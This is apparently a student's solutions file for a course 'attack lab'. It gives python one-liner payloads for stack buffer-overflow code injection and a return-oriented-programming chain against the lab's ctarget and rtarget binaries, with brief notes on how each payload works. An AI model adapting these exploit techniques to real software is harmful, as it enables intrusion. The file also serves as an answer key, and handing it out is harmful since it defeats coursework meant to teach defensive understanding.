# Solutions

cookie: 0x59b997fa

## info

piping into gdb example: ./hex2raw < phase2.txt > rawphase2.txt

## phase 1

python3 -c 'import sys; sys.stdout.buffer.write(b"a"*40 + b"\xc0\x17\x40")' | ./ctarget -q

## phase 2

gcc -c gen_byte_code.s
objdump -d gen_byte_code.o  > gen_byte_code.d

info: move cookie to rdi, push address of touch2 onto stack (this updates the stack pointer also), call retq (which pops return address from stack which points to touch2.

python3 -c 'import sys; sys.stdout.buffer.write( b"\xbf\xfa\x97\xb9\x59" + b"\x68\xec\x17\x40\x00" + b"\xc3" + b"\x00"*29 + b"\x78\xdc\x61\x55" + b"\x00"*4)' | ./ctarget -q

## phase 3

cookie:

0x35 0x39 0x62 0x39 0x39 0x37 0x66 0x61

continue at address 0x5561dc78 (first address of buffer);
move memory address of first character of string into rdi (address is 0x5561dc78 + 49... remember: 40-48 is reserved for return address that points at exploit code);
push func address of touch3 onto stack;
return (this takes you to touch3);

python3 -c 'import sys; sys.stdout.buffer.write( b"\x48\xc7\xc7\xa8\xdc\x61\x55" + b"\x68\xfa\x18\x40\x00" + b"\xc3" + b"\x00"*27 + b"\x78\xdc\x61\x55" + b"\x00"*4 + b"\x35\x39\x62\x39\x39\x37\x66\x61\x00")' | ./ctarget -q

## phase 4

Probable approach: use our interesting code bits in our gadgets to pass cookie to rdi, then hit touch 2... we want to structure our buffer so that it contains addresses of interesting function bits in sequential order.

^ this approach was right!

python3 -c 'import sys; sys.stdout.buffer.write(b"\x90"*40 + b"\xcc\x19\x40"+ b"\x00"*5 + b"\xfa\x97\xb9\x59" + b"\x00"*4 + b"\xa2\x19\x40" + b"\x00"*5 + b"\xec\x17\x40"+b"\x00"*5)' | ./rtarget -q

## phase 5